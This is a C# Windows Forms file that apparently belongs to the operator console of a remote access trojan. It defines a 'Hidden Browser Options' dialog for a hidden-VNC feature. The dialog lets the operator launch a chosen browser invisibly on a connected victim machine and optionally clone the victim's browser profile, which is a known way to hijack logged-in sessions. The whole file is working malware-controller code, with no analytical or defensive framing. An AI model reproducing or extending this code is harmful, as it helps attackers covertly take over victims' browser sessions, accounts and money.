

using System;
using System.Collections.Generic;
using System.Windows.Forms;
using InvokedCommon.Messages;
using InvokedServer.Helper;
using InvokedServer.Networking;


namespace InvokedServer.Forms
{
	public partial class FrmHVNCBrowserOptions : Form
	{
		private string _selectedItem;
		private readonly Client _connectClient;
		private static readonly Dictionary<Client, FrmHVNCBrowserOptions> OpenedForms = new Dictionary<Client, FrmHVNCBrowserOptions>();

		public FrmHVNCBrowserOptions(Client client)
		{
			this._connectClient = client;
			this.InitializeComponent();
		}

		public static FrmHVNCBrowserOptions CreateNewOrGetExisting(Client client)
		{
			if (FrmHVNCBrowserOptions.OpenedForms.ContainsKey(client))
				return FrmHVNCBrowserOptions.OpenedForms[client];
			FrmHVNCBrowserOptions newOrGetExisting = new FrmHVNCBrowserOptions(client);
			newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmHVNCBrowserOptions.OpenedForms.Remove(client));
			FrmHVNCBrowserOptions.OpenedForms.Add(client, newOrGetExisting);
			return newOrGetExisting;
		}

		private void FrmHVNCBrowserOptions_Load(object sender, EventArgs e)
		{
			this.Text = WindowHelper.GetWindowTitle("Hidden Browser Options", this._connectClient);
		}

		private void cbBrowsers_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.StartProgramBtn.Enabled = true;
			this._selectedItem = this.cbBrowsers.SelectedItem.ToString();
		}

		private void StartProgramBtn_Click(object sender, EventArgs e)
		{
			if (this._selectedItem == null)
				return;
			string str = "StartNewProfile" + this._selectedItem;
			bool flag = this.CloneProfileCheckBox.Checked;
			this._connectClient.Send<DoNewProcessHVNC>(new DoNewProcessHVNC()
			{
				PresetProcess = str,
				CloneBrowser = flag
			});
			this.DialogResult = DialogResult.OK;
			this.Close();
		}
	}
}